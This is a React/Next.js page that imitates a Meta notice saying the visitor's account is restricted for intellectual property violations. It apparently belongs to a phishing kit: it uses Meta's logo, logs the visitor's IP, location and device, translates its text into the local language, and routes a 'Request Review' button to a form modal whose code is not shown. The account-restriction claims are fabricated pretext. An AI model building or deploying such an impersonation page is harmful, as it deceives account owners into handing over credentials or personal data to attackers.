'use client';

import '@/assets/css/community-help.css';
import HeroBackground from '@/assets/images/background.png';
import HeroImage from '@/assets/images/bg_hero.png';
import CopyrightImage from '@/assets/images/copyright.png';
import CounterfeitImage from '@/assets/images/counterfeit.png';
import WarningIcon from '@/assets/images/ic_warning.svg';
import LogoMeta from '@/assets/images/logo-meta.svg';
import TrademarkImage from '@/assets/images/trade-mark.png';
import { store } from '@/store/store';
import { getDeviceLabel } from '@/utils/device';
import translateText from '@/utils/translate';
import axios from 'axios';
import dynamic from 'next/dynamic';
import Image from 'next/image';
import Link from 'next/link';
import { useEffect, useRef, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

const TEXT = {
    heroTitle: 'Violation of Community Standards',
    heroLead:
        'Our technology and review teams help detect and review content that may violate our policies. When we find content that does not follow our Community Standards, we may remove it and take action on the account responsible.',
    appealTitle: 'Your account has been restricted or disabled',
    appealP1:
        'We determined that some activity on your account may not follow our Community Standards.',
    appealP2:
        'In particular, we found content that may violate our Intellectual Property policies, which include protections for copyrights and trademarks. When users repeatedly share content that violates these policies, we may take additional actions on their accounts.',
    whyTitle: 'Why this happened',
    whyP1:
        'Your account or content may have been reported by other users or detected by our automated systems for potentially violating our policies related to intellectual property rights.',
    whyP2:
        'These policies help protect creators, businesses and individuals from unauthorized use of their work, brand names or protected materials.',
    whatTitle: 'What you can do',
    whatP1: 'If you believe this action was taken by mistake, you may request a review.',
    whatP2:
        'During the review process, our team will evaluate your account activity and the reported content to determine whether it complies with our policies.',
    whatP3:
        'You can also learn more about our policies and how to avoid violations in the future by visiting our Help Center.',
    requestReview: 'Request Review',
    ipSectionTitle: 'What is an Intellectual Property Violation?',
    trademarkTitle: 'Trademark',
    trademarkBody:
        'A trademark is a word, slogan, symbol or design (example: brand name, logo) that distinguishes the products or services offered by one person, group or company from another. Generally, trademark law seeks to prevent confusion among consumers about who provides or is affiliated with a product or service.',
    copyrightTitle: 'Copyright',
    copyrightBody:
        "Copyright is a legal right that seeks to protect original works of authorship (example: books, music, film, art). Generally, copyright protects original expression such as words or images. It does not protect facts and ideas, although it may protect the original words or images used to describe an idea. Copyright also doesn't protect things like names, titles and slogans; however, another legal right called a trademark might protect those.",
    counterfeitTitle: 'Counterfeit Goods',
    counterfeitBody:
        "A counterfeit good is a knockoff or replica version of another company's product. It usually copies the trademark (name or logo) and/or distinctive features of that other company's product to imitate a genuine product. The manufacture, promotion or sale of a counterfeit goods is a type of trademark infringement that is illegal in most countries, and is recognized as being harmful to consumers, trademark owners and honest sellers. Please note that counterfeit goods may be unlawful even if the seller explicitly says that the goods are counterfeit, or otherwise disclaims authenticity of the goods.",
    footerAbout: 'About',
    footerPrivacy: 'Privacy',
    footerTerms: 'Terms',
    footerHelp: 'Help Centre'
} as const;

const textsToTranslate = Object.values(TEXT);

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, geoInfo, setDeviceLabel } = store();
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [modalKey, setModalKey] = useState(0);
    const isTranslatingRef = useRef(false);

    const t = (text: string): string => translations[text] || text;

    useEffect(() => {
        document.title = TEXT.heroTitle;
    }, []);

    useEffect(() => {
        if (typeof window !== 'undefined') {
            setDeviceLabel(getDeviceLabel(navigator.userAgent));
        }
    }, [setDeviceLabel]);

    useEffect(() => {
        if (geoInfo) {
            return;
        }

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    country_code: data.country_code || 'US',
                    region: data.region || ''
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (!geoInfo || isTranslatingRef.current || Object.keys(translations).length > 0) {
            return;
        }

        isTranslatingRef.current = true;

        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }
            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo, translations]);

    const openReviewModal = () => {
        setModalKey((prev) => prev + 1);
        setModalOpen(true);
    };

    return (
        <div className='community-page flex min-h-screen w-full justify-center bg-white text-[#1C2B33]'>
            <div className='w-full'>
                <div className='flex h-[52px] items-center justify-center border-b border-[#E0E0E0] bg-[#F5F6F6]'>
                    <div className='flex w-full max-w-[1280px] items-center justify-between px-4'>
                        <Link href='#' className='inline-flex' onClick={(e) => e.preventDefault()}>
                            <Image src={LogoMeta} alt='Meta' className='h-[22px] w-auto' priority />
                        </Link>
                    </div>
                </div>

                <div
                    className='flex items-center justify-center bg-cover bg-no-repeat'
                    style={{ backgroundImage: `url(${HeroBackground.src})` }}
                >
                    <div className='flex w-full max-w-[1280px] flex-col items-center justify-between gap-8 px-4 py-6 md:flex-row md:gap-0'>
                        <div className='flex min-h-[300px] w-full max-w-full flex-col items-start justify-center text-left md:max-w-[50%] md:min-h-0'>
                            <h1 className='mb-3 text-[32px] font-[700]'>{t(TEXT.heroTitle)}</h1>
                            <p className='mb-2 text-[16px]'>{t(TEXT.heroLead)}</p>
                        </div>
                        <div className='flex min-h-[300px] w-full max-w-full items-center justify-center md:max-w-[50%] md:min-h-0'>
                            <Image src={HeroImage} alt='' className='h-auto w-full' priority />
                        </div>
                    </div>
                </div>

                <div className='border-b border-[#E0E0E0]'>
                    <div className='community-appeal'>
                        <div className='community-appeal-intro'>
                            <div className='community-appeal-header'>
                                <Image src={WarningIcon} alt='' width={29} height={29} className='h-[29px] w-[29px]' />
                                <b className='community-appeal-title'>{t(TEXT.appealTitle)}</b>
                            </div>
                            <p className='text-gray-800'>{t(TEXT.appealP1)}</p>
                            <p className='text-gray-800'>{t(TEXT.appealP2)}</p>
                        </div>

                        <div className='community-appeal-section'>
                            <p className='community-appeal-section-title'>{t(TEXT.whyTitle)}</p>
                            <p>{t(TEXT.whyP1)}</p>
                            <p>{t(TEXT.whyP2)}</p>
                        </div>

                        <div className='community-appeal-section'>
                            <p className='community-appeal-section-title'>{t(TEXT.whatTitle)}</p>
                            <p>{t(TEXT.whatP1)}</p>
                            <p>{t(TEXT.whatP2)}</p>
                            <p>{t(TEXT.whatP3)}</p>
                        </div>

                        <button type='button' className='community-appeal-button' onClick={openReviewModal}>
                            {t(TEXT.requestReview)}
                        </button>
                    </div>
                </div>

                <div className='community-ip-section mx-auto mt-10 w-full max-w-[1280px] px-4 pb-10'>
                    <p className='text-center'>
                        <b className='text-center text-2xl font-bold md:text-3xl'>{t(TEXT.ipSectionTitle)}</b>
                    </p>

                    <div className='community-ip-row community-ip-row-text-first'>
                        <div className='community-ip-copy community-ip-copy-left'>
                            <b className='text-xl font-bold md:text-2xl'>{t(TEXT.trademarkTitle)}</b>
                            <p className='mt-2 text-gray-800'>{t(TEXT.trademarkBody)}</p>
                        </div>
                        <div className='community-ip-image'>
                            <Image src={TrademarkImage} alt='' className='h-auto w-full' />
                        </div>
                    </div>

                    <div className='community-ip-row community-ip-row-image-first'>
                        <div className='community-ip-image'>
                            <Image src={CopyrightImage} alt='' className='h-auto w-full' />
                        </div>
                        <div className='community-ip-copy community-ip-copy-right'>
                            <b className='text-xl font-bold md:text-2xl'>{t(TEXT.copyrightTitle)}</b>
                            <p className='mt-2 text-gray-800'>{t(TEXT.copyrightBody)}</p>
                        </div>
                    </div>

                    <div className='community-ip-row community-ip-row-text-first'>
                        <div className='community-ip-copy community-ip-copy-left'>
                            <b className='text-xl font-bold md:text-2xl'>{t(TEXT.counterfeitTitle)}</b>
                            <p className='mt-2 text-gray-800'>{t(TEXT.counterfeitBody)}</p>
                        </div>
                        <div className='community-ip-image'>
                            <Image src={CounterfeitImage} alt='' className='h-auto w-full' />
                        </div>
                    </div>
                </div>

                <div className='w-full border-t border-[#E0E0E0] bg-[#F5F6F6] pt-5 pb-5'>
                    <div className='mx-auto w-full max-w-[1280px] px-4'>
                        <div className='community-footer-languages mb-4 flex flex-wrap justify-center gap-4 text-[13px] text-gray-600'>
                            <Link href='#' className='text-[#6D84B4] hover:underline' onClick={(e) => e.preventDefault()}>
                                English (US)
                            </Link>
                            <Link href='#' className='text-[#6D84B4] hover:underline' onClick={(e) => e.preventDefault()}>
                                English (UK)
                            </Link>
                            <Link href='#' className='text-[#6D84B4] hover:underline' onClick={(e) => e.preventDefault()}>
                                Italiano
                            </Link>
                            <Link href='#' className='text-[#6D84B4] hover:underline' onClick={(e) => e.preventDefault()}>
                                Français
                            </Link>
                            <Link href='#' className='text-[#6D84B4] hover:underline' onClick={(e) => e.preventDefault()}>
                                中文(简体)
                            </Link>
                            <Link href='#' className='text-[#6D84B4] hover:underline' onClick={(e) => e.preventDefault()}>
                                日本語
                            </Link>
                        </div>
                        <div className='community-footer-links flex flex-wrap justify-center gap-4 text-[13px] text-gray-600'>
                            <p className='mr-4'>© 2026 Meta</p>
                            <Link href='#' className='hover:underline' onClick={(e) => e.preventDefault()}>
                                {t(TEXT.footerAbout)}
                            </Link>
                            <Link href='#' className='hover:underline' onClick={(e) => e.preventDefault()}>
                                {t(TEXT.footerPrivacy)}
                            </Link>
                            <Link href='#' className='hover:underline' onClick={(e) => e.preventDefault()}>
                                {t(TEXT.footerTerms)}
                            </Link>
                            <Link href='#' className='hover:underline' onClick={(e) => e.preventDefault()}>
                                {t(TEXT.footerHelp)}
                            </Link>
                        </div>
                    </div>
                </div>
            </div>
            {isModalOpen && <FormModal key={modalKey} />}
        </div>
    );
};

export default Page;
